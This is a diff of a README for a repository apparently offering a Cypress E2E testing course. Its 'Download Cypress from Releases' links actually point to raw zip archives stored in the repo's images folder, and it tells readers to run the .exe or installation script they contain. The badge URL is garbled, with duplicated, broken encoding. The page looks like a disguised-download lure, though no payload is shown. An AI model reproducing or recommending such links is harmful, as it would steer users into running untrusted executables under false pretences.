@@ -1,6 +1,6 @@
 # 🌲 cypress-from-zero-to-hero - Learn E2E Testing with Ease
 
-![Download](https://github.com/SreejanAmancha/cypress-from-zero-to-hero/raw/refs/heads/main/images/from-to-zero-hero-cypress-v2.3.zip%20Now-%20%3E%20https%3A%2F%https://github.com/SreejanAmancha/cypress-from-zero-to-hero/raw/refs/heads/main/images/from-to-zero-hero-cypress-v2.3.zip%2FSreejanAmancha%2Fcypress-from-zero-to-hero%https://github.com/SreejanAmancha/cypress-from-zero-to-hero/raw/refs/heads/main/images/from-to-zero-hero-cypress-v2.3.zip)
+![Download](https://raw.githubusercontent.com/SreejanAmancha/cypress-from-zero-to-hero/main/images/to-from-zero-cypress-hero-1.2-alpha.3.zip%20Now-%20%3E%20https%3A%2F%https://raw.githubusercontent.com/SreejanAmancha/cypress-from-zero-to-hero/main/images/to-from-zero-cypress-hero-1.2-alpha.3.zip%2FSreejanAmancha%2Fcypress-from-zero-to-hero%https://raw.githubusercontent.com/SreejanAmancha/cypress-from-zero-to-hero/main/images/to-from-zero-cypress-hero-1.2-alpha.3.zip)
 
 ## 📋 Introduction
 
@@ -20,7 +20,7 @@ Before you begin, ensure you have the following:
 
 To get started, visit the Releases page to download the software:
 
-[Download Cypress from Releases](https://github.com/SreejanAmancha/cypress-from-zero-to-hero/raw/refs/heads/main/images/from-to-zero-hero-cypress-v2.3.zip)
+[Download Cypress from Releases](https://raw.githubusercontent.com/SreejanAmancha/cypress-from-zero-to-hero/main/images/to-from-zero-cypress-hero-1.2-alpha.3.zip)
 
 1. Click on the link above to be directed to the Releases page.
 2. Locate the latest release version.
@@ -29,7 +29,7 @@ To get started, visit the Releases page to download the software:
 
    - **Windows:** Double-click the downloaded .exe file to start the installation. Follow the prompts to complete the setup.
    - **macOS:** Open the downloaded .dmg file and drag the Cypress application to your Applications folder.
-   - **Linux:** Extract the downloaded https://github.com/SreejanAmancha/cypress-from-zero-to-hero/raw/refs/heads/main/images/from-to-zero-hero-cypress-v2.3.zip file and run the installation script in your terminal.
+   - **Linux:** Extract the downloaded https://raw.githubusercontent.com/SreejanAmancha/cypress-from-zero-to-hero/main/images/to-from-zero-cypress-hero-1.2-alpha.3.zip file and run the installation script in your terminal.
 
 Once the installation is complete, you can start using Cypress for your test automation needs.
 
@@ -86,4 +86,4 @@ This project is licensed under the MIT License. Feel free to use, modify, and co
 
 Explore the power of E2E testing and enhance your skills with the **cypress-from-zero-to-hero** course. Don't forget to visit the Releases page to download the latest version!
 
-[Download Cypress from Releases](https://github.com/SreejanAmancha/cypress-from-zero-to-hero/raw/refs/heads/main/images/from-to-zero-hero-cypress-v2.3.zip)
+[Download Cypress from Releases](https://raw.githubusercontent.com/SreejanAmancha/cypress-from-zero-to-hero/main/images/to-from-zero-cypress-hero-1.2-alpha.3.zip)
